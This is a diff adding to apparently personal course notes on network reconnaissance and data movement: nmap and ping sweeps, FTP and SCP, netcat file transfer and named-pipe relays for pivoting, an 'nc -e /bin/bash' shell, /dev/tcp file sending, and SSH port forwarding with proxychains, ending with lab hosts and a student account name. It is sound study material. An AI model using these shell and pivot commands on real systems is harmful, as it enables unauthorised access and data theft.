@@ -191,6 +191,7 @@ NETWORK RECONNAISSANCE - active, passive, internal, external
         nmap -sV <ip> <ports>
         nmap -O #os
         nmap -sP <ip range> #ping sweep
+            for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
         nmap -sU <ip range> #udp scan
            # Full Connect scan (NMAP) is only scan that will work through tunnel
         idle scan - using proxy to scan for you
@@ -219,20 +220,76 @@ NETWORK RECONNAISSANCE - active, passive, internal, external
         find / -iname "hint*" 2>/dev/null
         find / -iname "*pcap" 2>/dev/null
 
+DATA TRANSFER, MOVEMENT, AND REDIRECTION
+    TFTP (no directory structure, no authentication, no encryption)
+    FTP (Control TCP/21, Data TCP/20, Authentication with clear-text sign in)
+        wget -r ftp://<ip>
+    SFTP (Adds FTP to SSH)
+    FTPS (TCP/443, adds SSL/TLS)
 
 
+    ACTIVE FTP - client initiate connection on port 21, data initiated from server on port 20. Doesn't work over a tunnel
+    PASSIVE FTP - client initiate connection on port 21, data initiated from client. Works over tunnel
+        curl ftp://<ip>
 
+    
+    SCP (DATA CHANNEL ENCRYPTED WITH SYMMETRIC, CONTROL/AUTHENTICATION WITH ASYMMETRIC)
+        HOST KEY - uses asymmetric encryption for authentication. located on server
+        
+    NETCAT - read, write data across ntw #cat throws up (deleivers)
+        Client (sends file): nc 10.2.0.2 9001 < file.txt #either client or listener can send info once connected
+        Listener (receive file): nc -l -p 9001 > newfile.txt
+        
+        #ALL POSSIBLE PIVOT COMBOS
+        Listener  --> Client    | Client    --> Listener
+        Client    --> Listener  | Listener  --> Client       
+        Listener  --> Client    | Listener  --> Client
+        Client    --> Listener  | Client    --> Listener
 
+        NAMED PIPE (and nc example w/ pivot) #acts as buffer
+            #LISTENER2 (SENDS INFO) RUN LISTENERS BEFORE RELAY
+            nc -l -p 9002 < infile.txt
+            #LISTENER1 (RECEIVE INFO)
+            nc -l -p 9001 > outfile.txt
 
+           #RELAY CLIENT
+            mkfifo mypipe #bidirectional, persistent
+            nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+                #send info to mypipe    #take info from mypipe, send to nc
+            
+        REVERSE SHELL (slide 7.7)
+            nc -l -p <port> -e /bin/bash
+    /DEV/TCP
+        #receiving box
+        nc -l -p 1111 > file.txt
+        #sending box
+        cat file > /dev/tcp/10.2.0.2/1111
+    
+    SSH PORT FORWARDING
+        
+        LOCAL
 
+            INET        SALLY       JACK
+                       #1.1.1.1    #2.2.2.2
+            #DIRECT CONNECT TO PORT THAT IS SERVICE (HTTP, TELNET,..)
+            from INET:  ssh sally@1.1.1.1 -L 1234:2.2.2.2:80
 
+            from INET:  curl localhost:1234
+                #different terminal
 
+        DYNAMIC
+            ps -elf | grep "9050"       #look for background proxychains
+            
+            ssh sally@2.2.2.2 -D 9050 #always 9050
+            proxychains ./scan.sh
 
+    REMOTE PORT FORWARDING  - only to get through firewall. you connect to me and ill forward to target (insider)
+        from inside
 
-
-
-
-
+    net2
+    ATROPIA (T3) 10.50.27.79 net2_student11
+    Pineland T4 10.50.30.62 net2_student11
+    T5 10.50.20.155
 
 
 
